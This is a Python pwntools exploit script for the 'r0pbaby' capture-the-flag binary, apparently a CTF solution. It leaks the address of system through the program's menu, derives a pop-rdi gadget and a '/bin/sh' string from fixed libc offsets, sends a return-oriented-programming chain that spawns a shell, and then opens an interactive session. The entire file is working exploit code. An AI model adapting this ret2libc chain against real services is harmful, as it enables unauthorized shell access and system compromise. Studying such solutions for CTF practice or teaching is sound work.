from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./r0pbaby_542ee6516410709a1421141501f03760")
else:
    conn = remote(HOST, PORT)

elf = ELF("./r0pbaby_542ee6516410709a1421141501f03760")

gdb.attach(conn)

"""[2] system
"""
conn.recvuntil("\n: ")
conn.sendline("2")
print conn.recvuntil(": ")
conn.sendline("system")
m = conn.recvuntil("\n: ")
first = m.find('0')
end = m.find('\n')
system_addr = long(m[first:end], 16)
print "[+] system_addr={}\n".format(hex(system_addr))
print m

"""[3] exploit
"""
pop_rdi_gadget = system_addr - 0x249A6
binsh_string = system_addr + 0x1449A0

print "[+] pop_rdi_gadget={}\n".format(hex(pop_rdi_gadget))
print "[+] binsh_string={}\n".format(hex(binsh_string))

conn.sendline("3")
print conn.recvuntil(": ")
conn.sendline("32")

ROP = "A" * 8
ROP += p64(pop_rdi_gadget)
ROP += p64(binsh_string)
ROP += p64(system_addr)

print "[+] ROP={}\n".format(ROP)
conn.sendline(ROP)

"""[4] interactive
"""
conn.interactive()
